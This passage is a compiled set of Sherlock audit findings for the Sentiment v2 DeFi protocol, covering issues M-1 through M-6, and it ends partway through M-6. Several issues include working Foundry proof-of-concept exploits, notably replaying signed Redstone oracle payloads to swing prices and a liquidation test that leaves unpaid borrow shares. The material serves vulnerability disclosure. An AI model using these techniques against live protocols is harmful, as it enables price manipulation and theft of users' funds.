# Issue M-1: Red Stone Oracle Can Time Travel 

Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/23 

## Found by 
HHK, cawfree
## Summary

The [`RedstoneCoreOracle`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/src/oracle/RedstoneOracle.sol) can be atomically manipulated repeatedly back and forth between different observations within the validity period to yield different price readings upon demand.

## Vulnerability Detail

The [`RedstoneCoreOracle`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/src/oracle/RedstoneOracle.sol#L12C10-L12C28) requires callers to manually update and cache the oracle price via the [`updatePrice`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/src/oracle/RedstoneOracle.sol#L48C14-L48C25) function:

```solidity
function updatePrice() external {
    // values[0] -> price of ASSET/USD
    // values[1] -> price of ETH/USD
    // values are scaled to 8 decimals

    uint256[] memory values = getOracleNumericValuesFromTxMsg(dataFeedIds);

    assetUsdPrice = values[0];
    ethUsdPrice = values[1];

    // RedstoneDefaultLibs.sol enforces that prices are not older than 3 mins. since it is not
    // possible to retrieve timestamps for individual prices being passed, we consider the worst
    // case and assume both prices are 3 mins old
    priceTimestamp = block.timestamp - THREE_MINUTES;
}
```

Although here we correctly consider the worst-case staleness for newly-submitted observation (and the inter-observation timestamps themselves are validated to be consistent between both readings), there are are no protections against repeatedly calling [`updatePrice`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/src/oracle/RedstoneOracle.sol#L48C14-L48C25) using valid data during the result validity period (for example, two different observations which took place within the same validity period) - even if that data has been seen before.

This means it is possible to call [`updatePrice`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/src/oracle/RedstoneOracle.sol#L48C14-L48C25) with one valid observation, immediately call it with a second valid observation, and then update again to revert back to the original observation in an effort to manipulate price.

### Proof of Concept

This proof of concept is split into two sections - for quick verification, judges need only focus on the first part, whereas the second part provides instructions on how to recreate mock payloads locally.

#### Example Observations (default)

1. Add the following file (i.e. `Sherlock.t.sol`) to the [`protocol-v2/test`](https://github.com/sherlock-audit/2024-08-sentiment-v2/tree/main/protocol-v2/test) directory:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import { Math } from "@openzeppelin/contracts/utils/math/Math.sol";
import "@redstone-oracles-monorepo/packages/evm-connector/contracts/data-services/MainDemoConsumerBase.sol";

import {RedstoneCoreOracle} from "../src/oracle/RedstoneOracle.sol";

/// @notice A mock oracle which allows us to use Sentiment's
/// @notice `RedstoneCoreOracle` in conjunction with the
/// @notice mock payload signatures.
contract SherlockRedstoneCoreOracle is RedstoneCoreOracle {

    constructor(address asset, bytes32 assetFeedId, bytes32 ethFeedId)
        RedstoneCoreOracle(asset, assetFeedId, ethFeedId) {}

    function getUniqueSignersThreshold() public view virtual override returns (uint8) {
        return 1;
    }

    function getAuthorisedSignerIndex(
        address signerAddress
    ) public view virtual override returns (uint8) {
        /// @notice Using the address related to the private key in
        /// @notice Redstone Finance's `minimal-foundry-repo`: https://github.com/redstone-finance/minimal-foundry-repo/blob/c493d4c1e15fa1b08ebaae85f454b843ba5999c4/getRedstonePayload.js#L24C24-L24C90

        /// @dev const redstoneWallet = new ethers.Wallet('0x548e7c2fae09cc353ffe54ed40609d88a99fab24acfc81bfbf5cd9c11741643d');
        //  @dev console.log('Redstone:', redstoneWallet.address);
        /// @dev Redstone: 0x71d00abE308806A3bF66cE05CF205186B0059503
        if (signerAddress == 0x71d00abE308806A3bF66cE05CF205186B0059503) return 0;

        revert SignerNotAuthorised(signerAddress);
    }
}

contract SherlockTest is Test {

    using Math for uint256;

    /// @notice Demonstrate that the `RedstoneCoreOracle` is
    /// @notice vulnerable to manipulation.
    function testSherlockRedstoneTimestampManipulation() external {
        /// @notice You must use an Arbitrum mainnet compatible
        /// @notice archive node rpc.
        vm.createSelectFork(vm.envString("ARB_RPC_URL"));

        /// @notice This conditional controls whether to generate and sign
        /// @notice Redstone payloads locally, in case judges would like to
        /// @notice verify the payload content for themselves. This happens
        /// @notice if you specify `GENERATE_REDSTONE_PAYLOADS=true`
        /// @notice in your `.env`.
        /// @notice By default, the test suite will fall back to the included payloads. 
        bool generatePayloads = vm.envExists("GENERATE_REDSTONE_PAYLOADS");
        if (generatePayloads) generatePayloads = vm.envBool("GENERATE_REDSTONE_PAYLOADS");

        /// @notice Warp to a recent Arbitrum block. We have this fixed
        /// @notice in place to ease the generation of mock observations
        /// @notice which satisfy the validity period.
        vm.warp(243528007) /* Warp To Block */;

        bytes memory beforePayload = (
            generatePayloads
                ? new SherlockMockRedstonePayload().getRedstonePayload("ETH:3000:8,USDC:1:8", "243528007000")
                : bytes(hex"455448000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000045d964b80055534443000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005f5e1000038b3667d5800000020000002f3d4b060d793f6ba027fcbb94ab6ba26f17a1527446c42e7bc32e14926aa2f1167d1d38049f766c56d48170b9acdea4315b2132a6e3bba0137b87bf2305df1371c0001000000000002ed57011e0000")
        );

        bytes memory afterPayload = (
            generatePayloads
                ? new SherlockMockRedstonePayload().getRedstonePayload("ETH:2989:8,USDC:1:8", "243528066000" /* 59s in the future */)
                : bytes(hex"45544800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004597d40d0055534443000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005f5e1000038b36763d00000002000000290709f13dc06738bbdb82175adbd9b0532cad9db59367b9e63ffac979230fdf222a0043cbcfe6244c30207df1355c416c6165b5d0b1d2a54eab53a807de8a5ed1b0001000000000002ed57011e0000")
        );

        SherlockRedstoneCoreOracle sherlockRedstoneCoreOracle = new SherlockRedstoneCoreOracle({
            asset: 0xaf88d065e77c8cC2239327C5EDb3A432268e5831,
            assetFeedId: bytes32("USDC"),
            ethFeedId: bytes32("ETH")
        });

        bool success;

        console.log("Apply Before Payload:");
        (success,) = address(sherlockRedstoneCoreOracle).call(
            abi.encodePacked(abi.encodeWithSignature("updatePrice()"), beforePayload)
        );
        require(success);

        console.log("ETH:", sherlockRedstoneCoreOracle.ethUsdPrice());
        console.log("USDC:", sherlockRedstoneCoreOracle.assetUsdPrice());

        console.log("Apply After Payload:");
        (success,) = address(sherlockRedstoneCoreOracle).call(
            abi.encodePacked(abi.encodeWithSignature("updatePrice()"), afterPayload)
        );
        require(success);

        console.log("ETH:", sherlockRedstoneCoreOracle.ethUsdPrice());
        console.log("USDC:", sherlockRedstoneCoreOracle.assetUsdPrice());

        console.log("Apply Before Payload Again:");
        (success,) = address(sherlockRedstoneCoreOracle).call(
            abi.encodePacked(abi.encodeWithSignature("updatePrice()"), beforePayload)
        );
        require(success);

        console.log("ETH:", sherlockRedstoneCoreOracle.ethUsdPrice());
        console.log("USDC:", sherlockRedstoneCoreOracle.assetUsdPrice());
    }

}

/// @notice A contract which we can use to pull results from
/// @notice `getRedstonePayload.js`, a utility which enables
/// @notice us to mock redstone payloads for local development.
/// @notice This is only used when `GENERATE_REDSTONE_PAYLOADS=true`.
/// @notice Credit: https://github.com/redstone-finance/minimal-foundry-repo/blob/main/getRedstonePayload.js
contract SherlockMockRedstonePayload is Test {
    function getRedstonePayload(
        // dataFeedId:value:decimals
        string memory priceFeed,
        // i.e. 1000
        string memory timestampMilliseconds
    ) public returns (bytes memory) {
        string[] memory args = new string[](4);
        args[0] = "node";
        args[1] = "../minimal-foundry-repo/getRedstonePayload.js";
        args[2] = priceFeed;
        args[3] = timestampMilliseconds;

        return vm.ffi(args);
    }
}
```

Next, run `ARB_RPC_URL="arbitrum-archive-node-url" forge test --match-test "testSherlockRedstoneTimestampManipulation" --ffi -vv` to yield the following:

```shell
Ran 1 test for test/Sherlock.t.sol:SherlockTest
[PASS] testSherlockRedstoneTimestampManipulation() (gas: 1332213)
Logs:
  Apply Before Payload:
  ETH: 300000000000
  USDC: 100000000
  Apply After Payload:
  ETH: 298900000000
  USDC: 100000000
  Apply Before Payload Again:
  ETH: 300000000000
  USDC: 100000000

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.52s (2.52s CPU time)

Ran 1 test suite in 3.10s (2.52s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

This demonstrates that the oracle price can be manipulated arbitrarily, atomically.

#### Generating Observations

In order to validate the calldata in the provided proof of concept exploit is authentic, in addition to the previous steps, judges will need to perform the following:

1. Clone Redstone Finance's [`minimal-foundry-repo`](https://github.com/redstone-finance/minimal-foundry-repo) to the top-level of the contest repo.
2. Run through [the setup instructions](https://github.com/redstone-finance/minimal-foundry-repo/tree/main?tab=readme-ov-file#foundry--redstone).
3. Modify [`getRedstonePayload.js`](https://github.com/redstone-finance/minimal-foundry-repo/blob/main/getRedstonePayload.js) so that we can control the timestamp that the signatures are validated at via CLI argument, instead of using the system clock (this ensures we can generate observations which match the fork block number in the test):

```diff
- const timestampMilliseconds = Date.now();
+ const timestampMilliseconds = parseInt(args[1]); /// @dev Allow us to use custom timestamps.
```

4. Verify the implementation is working. In the working directory of `minimal-foundry-repo`, you should be able to generate simulated observations at custom timestamps like so:

```shell
node getRedstonePayload.js ETH:2989:8,USDC:1:8 243528066000
0x45544800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004597d40d0055534443000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005f5e1000038b36763d00000002000000290709f13dc06738bbdb82175adbd9b0532cad9db59367b9e63ffac979230fdf222a0043cbcfe6244c30207df1355c416c6165b5d0b1d2a54eab53a807de8a5ed1b0001000000000002ed57011e0000
```

5. Finally, re-run the tests back in the foundry project using:

```shell
GENERATE_REDSTONE_PAYLOADS=true ARB_RPC_URL="arbitrum-archive-node-url" forge test --match-test "testSherlockRedstoneTimestampManipulation" --ffi -vv
```

## Impact

The [`RedstoneCoreOracle`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/src/oracle/RedstoneOracle.sol) can be arbitrarily and repeatedly warped between preferential timepoints that coexist within the validity period, and is therefore highly susceptible to price manipulation.

An attacker may exploit volatility over a three minute period (i.e. a stepwise reduction or appreciation in relative asset value) and repeatedly trade between minima and maxima - for example, purchasing at a checkpoint of low valuation and selling at a checkpoint of higher valuation.

This manipulation can be performed atomically within a single transaction, and requires little complexity.

## Code Snippet

https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/src/oracle/RedstoneOracle.sol#L48C5-L61C6

## Tool used

Manual Review

## Recommendation

Allow at least the `THREE_MINUTES` period to expire since the last update before accepting a new update; if an attempt is made during this period, then terminate execution silently without a `revert`.

Here's an [example](https://github.com/euler-xyz/euler-price-oracle/blob/eeb1847df7d9d58029de37225dabf963bf1a65e6/src/adapter/redstone/RedstoneCoreOracle.sol#L71C9-L72C75) of this approach.

# Issue M-2: Super pool uses `ERC20.approve` instead of safe approvals, causing it to always revert on some ERC20s 

Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/48 

## Found by 
000000, 0xAlix2, 0xBeastBoy, 0xLeveler, 0xdeadbeef, A2-security, AresAudits, Bauer, EgisSecurity, JuggerNaut63, KupiaSec, MohammedRizwan, Nihavent, NoOne, Obsidian, X12, ZeroTrust, cryptomoon, h2134, hash, jennifer37, sheep
### Summary

Super pools that get created on a specific asset then leverage its positions and deposit them in the "main" pools. Super pools get created in `SuperPoolFactory::deploySuperPool`, where some initial amount is sent from the user, and then deposited in the deployed super pool. When the assets are sent from the user, the factory approves the deployed pool, to allow outbound transfers, this is done using https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/SuperPoolFactory.sol#L73:
```solidity
IERC20(asset).approve(address(superPool), initialDepositAmt);
```
And the "default" ERC20 behavior expects the `approve` function to return a boolean, however, some ERC20s on some chains don't return a value.
The most popular example is USDT on the main net, and as the docs mention it should be compatible on any EVM chain and will support USDT:
>Q: On what chains are the smart contracts going to be deployed?
Any EVM-compatbile network

>Q: If you are integrating tokens, are you allowing only whitelisted tokens to work with the codebase or any complying with the standard? Are they assumed to have certain properties, e.g. be non-reentrant? Are there any types of [weird tokens](https://github.com/d-xo/weird-erc20) you want to integrate?
Tokens are whitelisted, only tokens with valid oracles can be used to create Base Pools.
Protocol governance will ensure that oracles are only set for standard ERC-20 tokens (plus USDC/USDT)

Another occurrence of this is `SuperPool::reallocate`, [here](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/SuperPool.sol#L450).

This causes Super pool to never work on these chains/tokens.


### Root Cause

Some known tokens don't return a value on approvals, more info [here](https://github.com/d-xo/weird-erc20?tab=readme-ov-file#missing-return-values), an example of this is USDT, which is mentioned that the protocol will use it.

Standard ERC20s return a boolean on approval, https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/IERC20.sol#L67.

USDT on the main net doesn't return a value, https://etherscan.io/token/0xdac17f958d2ee523a2206206994597c13d831ec7#code.

### Impact

Super pools can never be created and used for assets that don't return a value on approval, an example of this is USDT on Ethereum main net.

### PoC

Minimal mock USDT token:
```solidity
// SPDX-License-Identifier: AGPL-3.0-only
pragma solidity >=0.8.0;

contract MockUSDT {
    string public name;
    string public symbol;
    uint8 public immutable decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol, uint8 _decimals) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
    }

    function approve(address spender, uint256 amount) public {
        allowance[msg.sender][spender] = amount;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max)
            allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}
```

Add the following test in `protocol-v2/test/core/Superpool.t.sol`.
```solidity
function testSuperPoolUSDT() public {
    MockUSDT USDT = new MockUSDT("USDT", "USDT", 6);
    FixedPriceOracle USDToracle = new FixedPriceOracle(1e18);

    vm.startPrank(protocolOwner);
    riskEngine.setOracle(address(USDT), address(USDToracle));
    pool.initializePool(
        poolOwner,
        address(USDT),
        type(uint128).max,
        0xeba2c14de8b8ca05a15d7673453a0a3b315f122f56770b8bb643dc4bfbcf326b
    );
    vm.stopPrank();

    uint256 amount = 100e6;

    deal(address(USDT), address(this), amount);

    USDT.approve(address(superPoolFactory), amount);

    vm.expectRevert();
    superPoolFactory.deploySuperPool(
        address(this),
        address(USDT),
        feeTo,
        0.01 ether,
        1_000_000 ether,
        amount,
        "test",
        "test"
    );
}
```

### Mitigation

Use `safeApprove` instead of `approve` in `SuperPoolFactory::deploySuperPool` and `SuperPool::reallocate`.

# Issue M-3: Removing a known asset in the `PositionManager` causes all deposited funds of that asset to be locked forever 

Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/71 

## Found by 
000000, 0xAlix2, 0xAristos, 0xDazai, 0xLeveler, A2-security, KupiaSec, Tendency, ThePharmacist, Yashar, almurhasan, cryptomoon, dhank, iamandreiski, theweb3mechanic, tvdung94
### Summary

When users deposit funds in their position through the position manager, it checks if the deposited asset is known, this is done in:
```solidity
// mitigate unknown assets being locked in positions
if (!isKnownAsset[asset]) revert PositionManager_DepositUnknownAsset(asset);
```
This makes sense, as not to allow users to deposit dummy/worthless assets in their positions. The position manager also allows users to transfer tokens out of their position, the main problem is that it also checks if the asset is known before allowing the transfer.

This causes an issue where if the user had some funds deposited in token X, and then that token X was removed from known assets, the user's funds will be locked/stuck forever.

**NOTE: even if the owner is trusted, however, in case of an attack or a depeg or any other scenario, and the owner urgently removes the asset, users should still be able to transfer out these tokens. It doesn't make sense for the owner to "wait" until all users transfer out these tokens in case of an emergency.**


### Root Cause

The main issue lies in the "isKnownAsset" check in `PositionManager::transfer`, https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/PositionManager.sol#L316:
```solidity
if (!isKnownAsset[asset]) revert PositionManager_TransferUnknownAsset(asset);
```

### Attack Path

1. The user deposits some funds of token X.
2. For whatever reason, X is removed from the known assets in the position manager.
3. The user is unable to transfer out his deposited tokens, and they're stuck forever.

### Impact

The user's tokens will remain stuck in his position forever.

### PoC

Add the following test in `protocol-v2/test/core/PositionManager.t.sol`:

```solidity
function testStuckTokens() public {
    uint256 amount = 100 ether;

    deal(address(asset2), positionOwner, amount);

    // Verify that asset2 is known
    assertTrue(
        PositionManager(positionManager).isKnownAsset(address(asset2))
    );

    // User adds asset2 to the position and deposits 100 tokens
    vm.startPrank(positionOwner);
    asset2.approve(address(positionManager), amount);
    PositionManager(positionManager).process(
        position,
        addToken(address(asset2))
    );
    PositionManager(positionManager).process(
        position,
        deposit(address(asset2), amount)
    );
    vm.stopPrank();

    // asset2 is removed from the known assets
    vm.prank(protocolOwner);
    PositionManager(positionManager).toggleKnownAsset(address(asset2));

    // Verify that asset2 is not known
    assertFalse(
        PositionManager(positionManager).isKnownAsset(address(asset2))
    );

    // User tries to transfer out his tokens, reverts
    vm.prank(positionOwner);
    vm.expectRevert(
        abi.encodeWithSelector(
            PositionManager.PositionManager_TransferUnknownAsset.selector,
            address(asset2)
        )
    );
    PositionManager(positionManager).process(
        position,
        transfer(positionOwner, address(asset2), amount)
    );
}
```

### Mitigation

Remove the "isKnownAsset" check from `PositionManager::transfer`.

# Issue M-4: Liquidators Are Incentivised To Create Imaginary Borrow Debt 

Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/80 

## Found by 
Oblivionis, Obsidian, X12, cawfree
## Summary

Liquidators have the freedom to control how many borrow shares are burned from a position during liquidation, regardless of the underlying capital that is taken.

This allows liquidators to liquidate positions but leave them in a state that they continue to grow unhealthy, **even though all outstanding debts have been repaid**.

## Vulnerability Detail

When liquidating a risky position via [`liquidate`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/src/PositionManager.sol#L430C14-L430C23), the liquidator has the freedom to specify the to be taken from the position (`assetData`) independently of the outstanding debt that is processed (`debtData`):

```solidity
/// @notice Liquidate an unhealthy position
/// @param position Position address
/// @param debtData DebtData object for debts to be repaid
/// @param assetData AssetData object for assets to be seized
function liquidate(
    address position,
    DebtData[] calldata debtData, /// @audit debtData_and_assetData_are_independent_of_one_another
    AssetData[] calldata assetData
) external nonReentrant {
    riskEngine.validateLiquidation(position, debtData, assetData);

    // liquidate
    _transferAssetsToLiquidator(position, assetData);
    _repayPositionDebt(position, debtData);

    // position should be within risk thresholds after liquidation
    if (!riskEngine.isPositionHealthy(position)) revert PositionManager_HealthCheckFailed(position);
    emit Liquidation(position, msg.sender, ownerOf[position]);
}
```

Due to insufficient validation, there is a discontinuity between the number of assets that are taken from a position versus the underlying shares that are burned.

We can demonstrate that due to this inconsistency, a liquidator can liquidate a position and has the power to control whether to burn all the outstanding borrows (i.e. make the position healthy again) or liquidate the same amount of assets but leave outstanding borrows (i.e. make the position healthy again but allow it to continue to grow unhealthy post liquidation, even though all obligations have been fully repaid).

In both instances, although all of debt is repaid, the liquidator can control the amount of borrow shares remaining; thus they can fully liquidate a position but allow the position to grow more unhealthy as a means of value extraction.

### LiquidationTest.t.sol

To verify the following proof of concept, copy the `testLiquidateUnfairly` function to [`test/LiquidationTest.t.sol`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/test/integration/LiquidationTest.t.sol#L12C10-L12C25):

```solidity
/// @notice The liquidator can leave outstanding debt obligations
/// @notice for fully-repaid loans.
function testLiquidateUnfairly() public {

    /// @notice The environment variable `SHOULD_LIQUIDATE_UNFAIRLY` can
    /// @notice can be used to toggle between the different cases:
    bool shouldLiquidateUnfairly = vm.envExists("SHOULD_LIQUIDATE_UNFAIRLY")
        && vm.envBool("SHOULD_LIQUIDATE_UNFAIRLY");

    /// @dev Prepare assets for the two users:
    asset1.mint(lender, 200e18);
    asset2.mint(user, 200e18);

    vm.prank(user);
        asset2.approve(address(positionManager), type(uint256).max);

    /// @dev Create positions for both users.
    (address userPosition, Action memory userAction)
        = newPosition(user, bytes32(uint256(0x123456789)));

    /// @dev Let's also assume the pool has deep liquidity:
    vm.startPrank(lender);
        asset1.approve(address(pool), type(uint256).max);
        pool.deposit(fixedRatePool, 100e18, lender);
    vm.stopPrank();

    /// @dev Let's create a borrow positions for the `user`:
    Action[] memory actions = new Action[](4);
    {
        vm.startPrank(user);
            actions[0] = userAction;
            actions[1] = deposit(address(asset2), 1e18);
            actions[2] = addToken(address(asset2));
            actions[3] = borrow(fixedRatePool, 0.5e18);
            positionManager.processBatch(userPosition, actions);
        vm.stopPrank();
    }

    /// @dev Created position is healthy:
    assertTrue(riskEngine.isPositionHealthy(userPosition));

    /// @dev Okay, let's assume due to market conditions,
    /// @dev asset2 deprecations and the position has become
    /// @dev liquidatable:
    vm.startPrank(protocolOwner);
        riskEngine.setOracle(address(asset2), address(new FixedPriceOracle(0.99e18))); // 1 asset2 = 0.99 eth
    vm.stopPrank();

    /// @dev Created position is unhealthy:
    assertFalse(riskEngine.isPositionHealthy(userPosition));

    (uint256 totalAssetValue, uint256 totalDebtValue, uint256 minReqAssetValue) = riskEngine.getRiskData(userPosition);

    console.log(
        shouldLiquidateUnfairly
            ? "Liquidating unfairly..."
            : "Liquidating fairly..."
    );

    uint256 positionShortfall = minReqAssetValue - totalAssetValue;
    assertEq(positionShortfall, 10000000000000000);

    /// @dev Liquidate the `userPosition`.
    asset1.mint(liquidator, 100 ether);
    vm.startPrank(liquidator);
        asset1.approve(address(positionManager), type(uint256).max);

        /// @notice Initial Liquidator Balances:
        assertEq(asset1.balanceOf(liquidator), 100000000000000000000);
        assertEq(asset2.balanceOf(liquidator), 0);

        /// @notice Initial Position Balances:
        assertEq(asset1.balanceOf(userPosition), 500000000000000000);
        assertEq(asset2.balanceOf(userPosition), 1000000000000000000);
        assertEq(protocol.pool().getBorrowsOf(fixedRatePool, userPosition), 500000000000000000);

        {
            // construct liquidator data
            DebtData[] memory debts = new DebtData[](1);
            debts[0] = DebtData({
                poolId: fixedRatePool,
                /// @notice In the fair case, the liquidator takes `500000000000000000`
                /// @notice borrow shares (`getBorrowsOf`). In the unfair case, the
                /// @notice liquidator need only take `10000000000000000`:
                amt: shouldLiquidateUnfairly ? 10000000000000000 : type(uint256).max
            });
            AssetData[] memory assets = new AssetData[](1);
            assets[0] = AssetData({ asset: address(asset2), amt: positionShortfall });
            positionManager.liquidate(userPosition, debts, assets);
        }

        assertTrue(riskEngine.isPositionHealthy(userPosition)) /* @notice Position is healthy immediately after. */;

        /// @notice First, notice the position's underlying assets are
        /// @notice liquidated identically for both the unfair liquidation
        /// @notice and the fair liquidation. This means in both instances,
        /// @notice all outstanding debt is repaid.
        assertEq(asset1.balanceOf(userPosition), 500000000000000000);
        assertEq(asset2.balanceOf(userPosition), 990000000000000000);

        assertEq(
            protocol.pool().getBorrowsOf(fixedRatePool, userPosition),
            /// @notice However, the unfair liquidation left outstanding borrow
            /// @notice shares even though the underlying assets were liquidated
            /// @notice consistently:
            shouldLiquidateUnfairly ? 490000000000000000 : 0
        );

        /// @notice When liquidating unfairly by leaving bad shares, the
        /// @notice liquidator spends less `asset1` in the process. This means
        /// @notice the protocol actually incentivises liquidators to act
        /// @notice maliciously:
        assertEq(
            asset1.balanceOf(liquidator),
            shouldLiquidateUnfairly
                ? 99990000000000000000 /// @audit The liquidator is charged less for leaving outstanding borrow shares.
                : 99500000000000000000
        );

        vm.warp(block.timestamp + 24 hours);

        /// @notice If the liquidator operates maliciously, the position
        /// @notice is unfairly liable to more liquidations as time progresses:
        assertEq(riskEngine.isPositionHealthy(userPosition), !shouldLiquidateUnfairly);
        console.log(
            string(
                abi.encodePacked(
                    "One day after liquidation, the position is ",
                    riskEngine.isPositionHealthy(userPosition) ? "healthy" : "unhealthy",
                    "."
                )
            )
        );

    vm.stopPrank();
}
```

Then run using:

```shell
SHOULD_LIQUIDATE_UNFAIRLY=false forge test --match-test "testLiquidateUnfairly" -vv # Happy path
SHOULD_LIQUIDATE_UNFAIRLY=true forge test --match-test "testLiquidateUnfairly" -vv # Malicious path
```

This confirms that liquidators have the choice to leave outstanding borrow shares on liquidated positions, even though for the exact same liquidation of assets, the position could have been left with zero outstanding borrow shares.

Additionally, we show that the liquidator actually returns less `asset1` to the pool, even though they are redeeming the same amount of underlying `asset2` from the liquidated position.

## Impact

Due to the monetary incentives, it is actually **more rational** for liquidators **to liquidate positions unfairly**.

This undermines the safety of all borrowers.

Additionally, imaginary borrow debt will prevent borrowers from being able to withdraw their own funds, even though all their debt was fairly repaid. Since the position's collateral cannot be withdrawn due to these imaginary outstanding borrow shares, this permits the malicious liquidator to repeatedly liquidate the position.

We can also anticipate that this debt would grow quite quickly, since the PoC demonstrates that after repaying all debt, the malicious liquidator can force the position into retaining `490000000000000000` / `500000000000000000` (98%) of the original borrow obligation.

## Code Snippet

```solidity
/// @notice Liquidate an unhealthy position
/// @param position Position address
/// @param debtData DebtData object for debts to be repaid
/// @param assetData AssetData object for assets to be seized
function liquidate(
    address position,
    DebtData[] calldata debtData,
    AssetData[] calldata assetData
) external nonReentrant {
    riskEngine.validateLiquidation(position, debtData, assetData);

    // liquidate
    _transferAssetsToLiquidator(position, assetData);
    _repayPositionDebt(position, debtData);

    // position should be within risk thresholds after liquidation
    if (!riskEngine.isPositionHealthy(position)) revert PositionManager_HealthCheckFailed(position);
    emit Liquidation(position, msg.sender, ownerOf[position]);
}
```

https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/src/PositionManager.sol#L426C5-L444C6

## Tool used

Manual Review

## Recommendation

Do not permit liquidators the flexibility to control the number of borrow shares burned, instead, compute these as a function of the assets taken from the position.

# Issue M-5: Liquidation fee is incorrectly calculated, leading to unprofitable liquidations 

Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/91 

## Found by 
0xKartikgiri00, A2-security, Bigsam, EgisSecurity, HHK, Oblivionis, Obsidian, Ryonen, S3v3ru5, ThePharmacist, X12, ZeroTrust, cryptomoon, hash, nfmelendez, ravikiran.web3
### Summary

Incorrect liquidation fee calculation makes liquidations unprofitable, leading to insolvency.

### Root Cause

During `PositionManager.liquidate()` , two things happen:

1. An amount `x` of the position’s collateral is paid to the liquidator ([link](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/src/PositionManager.sol#L438))
2. The liquidator pays off the debt of the position ([link](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/src/PositionManager.sol#L439))

During step 1, the liquidation fee is effectively calculated as `liquidationFee.mulDiv(x, 1e18)`

This is incorrect- the correct way would be to take the liquidation fee from the profit of the liquidator, rather than from the entire amount `x`

Due to this inaccuracy, a large majority of liquidations will be unprofitable:

### Example scenario

Consider a situation where liquidation fee is 30% (as stated in the contest README)

Say LTV = 90%, Debt value = $90, Collateral value drops from $100 to $98

Now, since the position LTV (90/98) is greater than the set LTV (90/100), the position is liquidatable

A liquidator aims to pay off the debt and receive the $98 worth of collateral, effectively buying the collateral at a discount of ~8%

However, They will only receive 70% of the $98 (due to the 30% liquidation fee), so they can only receive $68.6

This is extremely unprofitable since they have to pay off $90 worth of debt, and only receive $68.6 as a reward.

### The correct approach to calculating fee would be the following:

1. Calculate liquidator profit = Reward - Cost = $98 - $90 = $8
2. Calculate liquidator fee = feePercentage*profit = 30% of $8  = $2.4

This ensures that liquidations are still incentivised

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

_No response_

### Impact

Liquidations are unprofitable due to liquidation fee being calculated incorrectly.

This leads to bad debt and insolvency since there is no incentive to liquidate.

### PoC

_No response_

### Mitigation

Consider calculating the profit of the liquidation first, and take the fee based on that

# Issue M-6: Griefer can DOS the `SuperPool` creation and make it very expensive for other users 

Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/97 

The protocol has acknowledged this issue.

## Found by 
0xarno, 0xdeadbeef, A2-security, EgisSecurity, Kalogerone, Oblivionis, Yashar
### Summary

The `SuperPoolFactory.sol` contract creates new `SuperPool` instances using the `new` keyword, which is essentially using the `CREATE` opcode. This means that the address of the next `SuperPool` instance can be known by any user. To create a new `SuperPool`, it's essential to deposit and burn a minimum of 1000 shares. A griefer can frontrun `SuperPool` creation transactions and `transfer` small amounts of tokens to the known `SuperPool` address to make shares expensive and prevent the creation of the `SuperPool`.

### Root Cause

1. When using the `CREATE` opcode, the new contract address depends on the deployer address (the `SuperPoolFactory.sol` address which is known) and its nonce (which can be calculated by simply looking at `SuperPoolFactory`'s etherscan). Even [ethers](https://docs.ethers.org/v5/api/utils/address/#utils-getContractAddress) has a function to calculate the next address. This means that the next `SuperPool` address that will be created is known and can't be changed.

2. `SuperPool` creation requires the user to deposit and burn a minimum of `1000 shares`, otherwise the transaction will revert.

